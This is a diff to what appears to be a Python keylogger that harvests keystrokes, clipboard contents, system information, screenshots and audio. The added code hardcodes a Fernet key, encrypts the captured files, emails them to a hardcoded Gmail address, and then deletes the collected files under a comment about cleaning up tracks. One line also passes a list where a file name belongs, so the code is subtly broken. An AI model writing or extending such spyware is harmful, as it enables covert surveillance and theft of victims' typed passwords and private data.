@@ -33,11 +33,12 @@ audio_info = 'audio.wav'
 clipboard_info = 'clipboard.txt'
 screenshot_info = 'screenshot.png'
 
-
 # Encryption files
 system_info_e = 'e_system.txt'
 clipboard_info_e = 'e_clipboard.txt'
 keys_info_e = 'e_key_log.txt'
+
+key = "1z68XoIR--DJZbrMdkE6e13ESaUMnFW0NCEYuFHSfc4="
 
 fromaddr = "francopanko6@gmail.com"
 toaddr = fromaddr
@@ -196,12 +197,32 @@ while iterations < end_iterations:
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
 
+# File Encryption
+files_to_encrypt = [system_info, clipboard_info, keys_info]
+encrypted_files = [system_info_e, clipboard_info_e, keys_info_e]
 
+count = 0
 
+for encrypting_file in files_to_encrypt:
+    with open(files_to_encrypt[count], 'rb') as f:
+        data = f.read()
+    
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(data)
 
+    with open(encrypted_files, 'wb') as f:
+        f.write(encrypted)
+    
+    send_email(fromaddr, password, toaddr, encrypted_files[count])
+    count += 1
 
+time.sleep(120)
 
+delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
 
+# Cleans up track and deletes files
+for file in delete_files:
+    os.remove(file)
 
 if __name__ == "__main__":
     freeze_support()
